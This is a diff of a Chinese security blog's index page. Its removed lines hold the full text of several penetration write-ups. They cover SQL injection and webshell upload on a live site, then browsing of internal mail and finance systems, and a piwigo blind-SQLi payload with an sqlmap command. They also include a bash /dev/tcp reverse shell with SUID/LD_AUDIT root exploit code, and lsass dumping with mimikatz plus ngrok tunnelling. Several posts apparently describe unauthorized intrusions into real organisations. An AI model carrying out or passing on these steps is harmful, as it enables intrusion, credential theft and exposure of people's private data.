-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在渗透中遇到一个站点，顺手测试了一下，在搜索框随便输入了一个字符加个单引号直接报错了，差不多可以确认这里存在注入了。一般这种站安全性极差，测试了下其他地方，在一个登录框处又发现一个注入。<br><img src="https://i.imgur.com/ssn6B5g.png" alt=""><br>直接丢到sqlmap里面跑就行了。这里就不重新跑了，贴sqlmap的日志图出来。<img src="https://i.imgur.com/jHZdQHO.png" alt=""><br>从上面的图来看，其实我们并没有跑出password列，因为这是access数据库，sqlmap是基于暴力破解的形式，我们可以看看他的列名的特点，是admin_xxx,那么我们是不是可以猜测一下password列名的形式会不会是admin_password/admin_passwd/admin_pw 或者其他。又或者不管有没有注出来password我们先用注出来的admin账户进行暴力破解。这里我两者都试了，最后通过后者进入的。好了成功进入后台，找上传点。折腾了一番终于在一个比较隐蔽的地方找到了上传点。上传，成功拿到shell。<br><img src="https://i.imgur.com/oLUGvSA.png" alt=""><br><img src="https://i.imgur.com/OLX5o42.png" alt=""><br>补丁打满，想提权基本是不可能了。转换思路，查找敏感信息，因为这是一个大目标，提权不是必须不一定非得陷在这里。经过一番查找，翻到了数据库配置文件成功进入数据库，在这里查看到了一些管理员账号和密码，顺便说一下password列名是admin_pw,记录下来。这个站折腾的差不多了，手上的账号密码得让他充分发挥作用。这里可以用Googlehack语法去查找这个目标的其他站点例如<code>site:xxx.com 系统</code>也可以用扫描C段，推荐一个工具masscan，号称6分钟可以扫遍全网。确实很快，我们用它把这个站的C段全扫一遍，因为之前已经用正向代理把它的C段445全扫了一遍没啥收获，所以就直接选择扫描http服务了。使用命令<code>masscan -p 80, 8080 ip --rate=10000</code>即可rate参数代表的是发包速率。下面是截取的部分C段网站。<br><img src="https://i.imgur.com/SeR26Yn.png" alt=""><br>一个个的过一遍，有登录功能的话，用获取到的密码去尝试登录一下。这里一定要有耐心，不要放过一个可能存在问题的点。折腾了几个小时后，找到一个可以登录的站，而且是非常关键的那种。直接链接了内网各种系统。粗略看了下大概有六七十个吧，包括很多敏感的系统，都是可以直接链接进去的。<img src="https://i.imgur.com/4ek7jVb.png" alt=""><br>随便截取几个看下吧<br>个人邮件：<br><img src="https://i.imgur.com/UPVA1w3.png" alt=""><br>内部通讯录：<br><img src="https://i.imgur.com/NlWnafv.png" alt=""><br>财务：<br><img src="https://i.imgur.com/lqhnu8R.png" alt=""><br>还有很多就不一一截取了。<br>内网系统基本都很脆弱，本人没有做深入的测试。</p>
-<h3 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title="写在后面的话"></a>写在后面的话</h3><p>可能大家会觉得，一路看下来顺风顺水，其实哪有那么容易，我都不知道花了多久才找到这么一个站。很多目标往往都是从一个非常小的地方慢慢的被击破，非常需要耐心和细心。</p>
-
+        
+          <a class="article-more-a" href="/2018/10/26/从SQL注入到内网漫t/#more">more >></a>
+        
       
 
       
@@ -323,6 +583,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -372,21 +643,35 @@
         <a href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/" class="archive-article-date">
   	<time datetime="2018-10-25T10:34:18.648Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-25</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">816字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">代码审计Day1 - in_array函数缺陷</a></p>
-<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p>先来看看in_array()函数。<br><img src="https://i.imgur.com/RmXyLYr.png" alt=""><br>in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。<br><br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br><br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>看下以下代码就知道是怎么回事了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arry = [0,1,2,&apos;3&apos;];</span><br><span class="line">var_dump(1==&apos;1&apos;);  //true</span><br><span class="line">var_dump(1==&apos;12cac&apos;);  //false</span><br><span class="line">var_dump(0==&apos;casdcsd&apos;);  //true</span><br><span class="line">var_dump(0===&apos;1vdf&apos;);  //false</span><br><span class="line">var_dump(0===&apos;csdv&apos;);  //false</span><br><span class="line">var_dump(in_array(&apos;abc&apos;,$arry));  //true</span><br><span class="line">var_dump(in_array(&apos;1abc&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(&apos;4&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(1, $arry,true));  //true</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h4 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h4><p>漏洞的位置在：include/functions_rate.inc.php，include/config_default.inc.php，以及根目录下的picture.php。<br>这里只贴上关键代码。<br>先来看include/functions_rate.inc.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function rate_picture($image_id, $rate)</span><br><span class="line">&#123;</span><br><span class="line">  global $conf, $user;</span><br><span class="line"></span><br><span class="line">  if (!isset($rate)</span><br><span class="line">      or !$conf[&apos;rate&apos;]</span><br><span class="line">      or !in_array($rate, $conf[&apos;rate_items&apos;]))</span><br><span class="line">  &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">......省略部分</span><br><span class="line"></span><br><span class="line">if ($user_anonymous)</span><br><span class="line">  &#123;</span><br><span class="line">    $query.= &apos; AND anonymous_id = \&apos;&apos;.$anonymous_id.&apos;\&apos;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  pwg_query($query);</span><br><span class="line">  $query = &apos;</span><br><span class="line">INSERT</span><br><span class="line">  INTO &apos;.RATE_TABLE.&apos;</span><br><span class="line">  (user_id,anonymous_id,element_id,rate,date)</span><br><span class="line">  VALUES</span><br><span class="line">  (&apos;</span><br><span class="line">    .$user[&apos;id&apos;].&apos;,&apos;</span><br><span class="line">    .&apos;\&apos;&apos;.$anonymous_id.&apos;\&apos;,&apos;</span><br><span class="line">    .$image_id.&apos;,&apos;</span><br><span class="line">    .$rate</span><br><span class="line">    .&apos;,NOW())</span><br></pre></td></tr></table></figure></p>
-<p>这里的$rate使用in_arrar进行了处理，我们来看下$conf[‘rate_items’]是什么，$conf[‘rate_items’]在include/config_default.inc.php。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// rate_items: available rates for a picture</span><br><span class="line">$conf[&apos;rate_items&apos;] = array(0,1,2,3,4,5);</span><br></pre></td></tr></table></figure></p>
-<p>而picture.php刚好调用了rate_picture函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;PHPWG_ROOT_PATH&apos;,&apos;./&apos;);</span><br><span class="line">include_once(PHPWG_ROOT_PATH.&apos;include/common.inc.php&apos;);</span><br><span class="line">include(PHPWG_ROOT_PATH.&apos;include/section_init.inc.php&apos;);</span><br><span class="line">include_once(PHPWG_ROOT_PATH.&apos;include/functions_picture.inc.php&apos;);</span><br><span class="line"></span><br><span class="line">// Check Access and exit when user status is not ok</span><br><span class="line">check_status(ACCESS_GUEST);</span><br><span class="line"></span><br><span class="line">// access authorization check</span><br><span class="line">if (isset($page[&apos;category&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">  check_restrictions($page[&apos;category&apos;][&apos;id&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page[&apos;rank_of&apos;] = array_flip($page[&apos;items&apos;]);</span><br><span class="line"></span><br><span class="line">......省略部分</span><br><span class="line">if (isset($_GET[&apos;action&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">  switch ($_GET[&apos;action&apos;])</span><br><span class="line">  &#123;</span><br><span class="line">    case &apos;add_to_favorites&apos; :</span><br><span class="line">    &#123;</span><br><span class="line">      $query = &apos;</span><br><span class="line">INSERT INTO &apos;.FAVORITES_TABLE.&apos;</span><br><span class="line">  (image_id,user_id)</span><br><span class="line">  VALUES</span><br><span class="line">  (&apos;.$page[&apos;image_id&apos;].&apos;,&apos;.$user[&apos;id&apos;].&apos;)</span><br><span class="line">;&apos;;</span><br><span class="line">      pwg_query($query);</span><br><span class="line"></span><br><span class="line">      redirect($url_self);</span><br><span class="line"></span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">......省略部分</span><br><span class="line"></span><br><span class="line">case &apos;rate&apos; :</span><br><span class="line">    &#123;</span><br><span class="line">      include_once(PHPWG_ROOT_PATH.&apos;include/functions_rate.inc.php&apos;);</span><br><span class="line">      rate_picture($page[&apos;image_id&apos;], $_POST[&apos;rate&apos;]);</span><br><span class="line">      redirect($url_self);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>现在逻辑就比较清楚了，首先picture.php通过GET方式传入action，action的值是rate.然后传入的rate 的值会被include/functions_rate.inc.php 中的rate_picture这个函数进行检测，由于in_array()函数第三个属性默认为false，函数会对数据进行弱比较。<br>所以我们可以直接构造payload进行绕过造成SQL注入。<br>比如我们将 $rate 的值设置成 1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 那么SQL语句就变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&apos;127.0.0&apos;,1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;</span><br></pre></td></tr></table></figure></p>
-<p>这样就可以进行盲注了<br>简化后的代码如下<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731092236-352cbc9e-9460-1.png" alt=""></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接用sqlmap跑就行了<br>payload：<code>sqlmap -u &quot;http://127.0.0.1/cms/piwigo/picture.php?/2/category/1&amp;action=rate&quot; --data &quot;rate=1&quot; --dbs --batch</code></p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>将 in_array() 函数的第三个参数设置为 true</p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部<br>复现一遍。附上链接：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">代码审计Day1 - in_array函数缺陷</a><br>
+        
+          <a class="article-more-a" href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/#more">more >></a>
+        
       
 
       
@@ -394,93 +679,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-记一次曲折的Linux提权" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/19/记一次曲折的Linux提权/">记一次曲折的Linux提权</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/19/记一次曲折的Linux提权/" class="archive-article-date">
-  	<time datetime="2018-10-19T07:32:42.350Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="本文首发于合天智汇"><a href="#本文首发于合天智汇" class="headerlink" title="本文首发于合天智汇"></a>本文首发于合天智汇</h3><h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01 前言"></a>0X01 前言</h2><p>最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭 嘿嘿）于是就有了本文，也GET到了新的提权姿势。</p>
-<h2 id="0X02-正文"><a href="#0X02-正文" class="headerlink" title="0X02 正文"></a>0X02 正文</h2><p>shell怎么拿到的不详说，弱口令后台getshell。使用命令<code>whoami</code>查看当前权限。发现是<em>nobody</em>权限。nobody在linux中是一个不能登陆的帐号，一些服务进程如apache，aquid等都采用一些特殊的帐号来运行，比如nobody,news,games等等，这是就可以防止程序本身有安全问题的时候，不会被黑客获得root权限。<br><img src="https://i.imgur.com/NfrGeTP.png" alt=""><br><br><br>说道Linux提权最先想到的肯定是利用利用内核漏洞找到对应版本相应的exp直接进行溢出提权。<br><br>首先使用命令<code>uname -a</code>查看当前操作系统版本。发现是<code>2.6.18-194.17.1.el5</code><br><img src="https://i.imgur.com/mvrofpD.png" alt=""><br><br>比较老了，心里想着这还不分分钟给你提下来。linux提权首先的获取到一个交互式的shell。有好几种方法可以实现，这里我用的是bash法。首先在你vps上监听一个端口使用命令<code>nc -lvp port</code>即可，然后在webshell上执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>获取到反弹回来的shell。<br><img src="https://i.imgur.com/RB1Xwn5.png" alt=""><br><br><img src="https://i.imgur.com/JDd2ymA.png" alt=""><br><br>查找当前系统可使用的exp，上传，给权限，gcc编译，执行，一条龙操作。不过这个过程可能会遇到各种问题。受害主机可能没有装gcc，gcc编译提示缺少库，能执行却依旧提升不了权限。反正我是各种exp用尽然而还是提不下来。<br><br>转换思路，发现受害主机使用的是MySQL，于是一通乱翻终于找到了MySQL密码，想利用MySQL udf提权，不过之前Linux下udf提权一直没尝试过，而且网上关于这方面的文章很少还基本都长一个样，遂放弃。<br><img src="https://i.imgur.com/Fx7R4fm.png" alt=""><br><br>MySQL密码其实挺简单的，我就想着数据库密码都这么简单，会不会ssh也是个弱口令了，尝试去连接，不能直连，遂放弃。<br><img src="https://i.imgur.com/UJGljBj.png" alt=""><br><br>passwd shadow 文件也没权限读。怎么办？？各种搜索，发现还有一招SUID提权法。网上关于这方面的文章也比较少。SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。首先要找到系统里使用SUID的文件，使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code> <img src="https://i.imgur.com/2KMM7xU.png" alt=""><br><br>可以看到这么多文件都是都是带SUID 标识符的。这里我们使用ping。</p>
-<p>操作步骤如下（来自博客 <a href="https://blog.csdn.net/fffygapl/article/details/51783346）" target="_blank" rel="noopener">https://blog.csdn.net/fffygapl/article/details/51783346）</a></p>
-<p>切换到tmp目录<br>cd /tmp</p>
-<p>创建一个exploit目录<br>mkdir exploit</p>
-<p>查看ping命令带suid权限<br>ll /bin/ping</p>
-<p>创建target文件硬链接<br>ln /bin/ping /tmp/exploit/target</p>
-<p>查看target文件权限<br>ll /tmp/exploit/target</p>
-<p>把target文件加载到内存中<br>exec 3&lt; /tmp/exploit/target</p>
-<p>查看target在内存中的情况<br>“ll /proc/$$/fd/3”</p>
-<p>删除target文件<br>rm -rf /tmp/exploit/</p>
-<p>查看target在内存中的情况是删除状态<br>“ll /proc/$$/fd/3”</p>
-<p>创建一个c语言代码<br>vim payload.c </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__((constructor)) </span><br><span class="line">init()// 两个下划线</span><br><span class="line">&#123;</span><br><span class="line">     setuid(0);</span><br><span class="line">     system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>实际这里由于是反弹的bash所以不建议直接在bash下使用vim，可以自己本地写好然后传到tmp目录下即可。还有如果ll命令不可用的话可以使用ls -l代替。</p>
-<p>利用gcc编译这段代码<br><code>gcc -W -fPIC -shared -o /tmp/exploit payload.c</code></p>
-<p>提升到root权限<br><code>LD_AUDIT=&quot;\$ORIGIN&quot; exec /proc/self/fd/3</code></p>
-<p>执行完，查看当前会话已经是root</p>
-<p><img src="https://i.imgur.com/qed9M4c.png" alt=""><br><br>OK 已经是root权限了<br><br>接下的的操作就不细讲了，新建一个用户修改passwd添加到root用户组然后使用frp进行内网穿透，这里也有一个坑，在bash下用vi编辑passwd文件非常不方便，可以本地改好然后在替换掉passwd。附上一张ssh成功连接图。<img src="https://i.imgur.com/vKM7IPD.png" alt=""></p>
-<h2 id="0X03-写在后面的话"><a href="#0X03-写在后面的话" class="headerlink" title="0X03 写在后面的话"></a>0X03 写在后面的话</h2><p>也算是学习了一波新姿势了，感觉udf提权还是可以去摸索一下的，搞安全的就是在不断地实战中慢慢成长。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/19/记一次曲折的Linux提权/">展开全文 >></a>
         </p>
       
 
@@ -525,16 +739,35 @@
         <a href="/2018/09/21/记一次实战渗透过程中的知识点总结/" class="archive-article-date">
   	<time datetime="2018-09-21T02:30:01.352Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">946字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。</p>
-<h2 id="0x01-知识点一"><a href="#0x01-知识点一" class="headerlink" title="0x01 知识点一"></a>0x01 知识点一</h2><p>拿下目标shell后发现直接是system权限。<br><img src="https://i.imgur.com/zawL4Ap.png" alt=""><br><br>system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被管理员发现。这里我选择的是传一个msf码子弹个meterpreter sessions回来。然而码子一传上去就被杀了，<code>tasklist /svc</code>发现可疑进程查询后得知是一款趋势科技的杀软。<code>kill pid</code>结束不掉，怎么办？免杀呗。经过免杀处理后能成功上传，正向反向都试了一遍，但是session还是始终弹不回来。大概就是下面这个样子，始终到不了ESTABLISHED状态。由于之前没保存图，又懒得再去搞一遍就这么描述一下吧。<img src="https://i.imgur.com/YYI4l5T.png" alt=""><br>这里我讲一下为什么我想弹meterpreter回来。主要是为了方便打内网和读密码。既然msf行不通那就只能变换思路。怎么办呢？无奈，只好去新建一个隐藏账户了，然而问题又来了，虽然执行命令没回显基本上是成功了，但是最后去连3389显示用户不存在。<img src="https://i.imgur.com/V1lBuSU.png" alt=""><br>是什么原因导致这种情况,我们把原因归结到杀软上，以为可能是杀软限制了执行与用户相关操作的命令，实际原因等我们最后登录上3389后发现并不是，这里是一个坑，还有怎么登上3389的文章最后再提。咋办？传mimikatz？失败，传不上。然后队友想到了一个好办法，mimikatz是从内存中读密码的。那么我们能不能把它的内存给导出来？最后找到一款绝对免杀的工具（微软官方工具）prodump，上传prodump.exe执行命令<code>prodump.exe -accepteula -ma lsass.exe lsass.dmp</code>成功导出内存。<img src="https://i.imgur.com/SfE6vAP.png" alt=""><br><br><img src="https://i.imgur.com/jZ19U6Y.png" alt=""><br>下载到本地用mimikatz读取。把<code>lsass.dmp</code>放到mimikatz目录下，执行命令<code>sekurlsa::minidmp lsass.dmp</code>和<code>sekurlsa::logonPasswords full</code>即可读出密码。直接读出了明文密码。<img src="https://i.imgur.com/5I8ypg2.png" alt=""></p>
-<h2 id="0X02-知识点二"><a href="#0X02-知识点二" class="headerlink" title="0X02 知识点二"></a>0X02 知识点二</h2><p>密码拿到了，连接3389试一下。然而，他只允许内网连接，尝试了用正向代理的方式，没成功，最后用了一款反向代理工具ngrok直接把它3389映射了出来。<br><img src="https://i.imgur.com/Ixwr85M.png" alt=""><br><br>ngrok需要到它的官网用邮箱注册，因为他实际上并不会验证，推荐使用临时邮箱。将ngrok上传到目标主机上。首先到ngrok官网上找到你的token。<br><img src="https://i.imgur.com/9F8Qz9V.png" alt=""><br><br>然后在目标主机上执行命令<code>ngrok.exe authtoken your token</code><br><img src="https://i.imgur.com/Z0lxcse.png" alt=""><br><br>然后在执行<code>ngrok.exe tcp 3389</code>即可，现在它的3389已经映射出来了。可以直接连接了，在连接之前要先查询下管理员是否在线使用命令<code>quser</code>即可。<img src="https://i.imgur.com/ArEn19O.png" alt=""><br>如果在线的话，贸然登录会把管理员给挤下去很容易被发现。这里我就贴一张之前登录成功的图吧。<br><img src="https://i.imgur.com/HzEoe1N.png" alt="">连接3389的方式，进入你的ngrok找到status复制里面的URL即可。<img src="https://i.imgur.com/a9QK5AJ.png" alt=""></p>
-<h2 id="0x03-写在后面的话"><a href="#0x03-写在后面的话" class="headerlink" title="0x03 写在后面的话"></a>0x03 写在后面的话</h2><p>最后登录进去是个什么情况了，发现他有密码复杂度和长度要求。所以我们之前添加用户没有成功并不是因为杀软的阻拦，以后添加用户密码一定得设置的复杂点。另外这个内网很大。</p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。<br>
+        
+          <a class="article-more-a" href="/2018/09/21/记一次实战渗透过程中的知识点总结/#more">more >></a>
+        
       
 
       
@@ -542,6 +775,21 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">总结</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -591,17 +839,35 @@
         <a href="/2018/09/06/记一次渗透测试实战/" class="archive-article-date">
   	<time datetime="2018-09-06T05:52:29.881Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-06</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">861字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前一直没搞过内网渗透实战，了解的相关知识仅停留在理论层次，最近搞了一波，写个笔记记录一下。</p>
-<h3 id="0X01-突破边界拿下shell"><a href="#0X01-突破边界拿下shell" class="headerlink" title="0X01 突破边界拿下shell"></a>0X01 突破边界拿下shell</h3><p>周末在家闲着没事突然就想搞事了，然后使用Google hack语法输入<code>inurl:xxx.xxx.xxx/upload</code>批量搜索可能存在上传点的网站，试了好几个最后找到一个可利用的上传点。<br><img src="https://i.imgur.com/UGa5YoQ.png" alt=""><br><br><img src="https://i.imgur.com/ygWmc6Q.png" alt=""><br><br>注：涉及敏感信息，图片仅供参考，具体内容自行填充。</p>
-<h3 id="0X02-反弹shell-amp-提权"><a href="#0X02-反弹shell-amp-提权" class="headerlink" title="0X02 反弹shell&amp;提权"></a>0X02 反弹shell&amp;提权</h3><p>Linux下需要把shell反弹出来以方便我们操作，但是目标主机上既没有nc也没有python，查询相关资料后尝试了一下利用bash弹shell。需要一台公网服务器，使用命令<code>bash -i &gt;&amp; /dev/tcp/your ip/1234 0&gt;&amp;1</code>公网服务器使用命令<code>nc -lvp 1234</code>监听1234端口<img src="https://i.imgur.com/GqVMiQx.png" alt=""><br><br><br><img src="https://i.imgur.com/uj7cqsG.png" alt=""><br><br><br>现在shell已经反弹出来了，使用<code>id</code>命令查看当前权限，发现仅为Apache，使用<br><code>uname -a</code>查看内核版本,发现服务器内核版本为2.6.31.5-127.fc12.1686<br><br><img src="https://i.imgur.com/pHbcXdP.png" alt=""><br><br>在exploit-db中搜索此版本的相关漏洞，<br>经过多次尝试，发现了下面这个exp来提升权限。<br><br><a href="https://www.exploit-db.com/exploits/15285/" target="_blank" rel="noopener">Linux Kernel 2.6.36-rc8 - ‘RDS Protocol’ Local Privilege Escalation</a><br><br>然而问题又来了，目标主机上没有gcc，怎么办?只能撞撞运气尝试在本地编译好，再传到目标主机上去执行。本地编译好exp后传到目标主机TMP路径下，执行命令<code>chmod 777 a</code>赋予exp执行权限，然后执行<code>./a</code>获取到root权限。<br><img src="https://i.imgur.com/QafgvgI.png" alt=""><br><br></p>
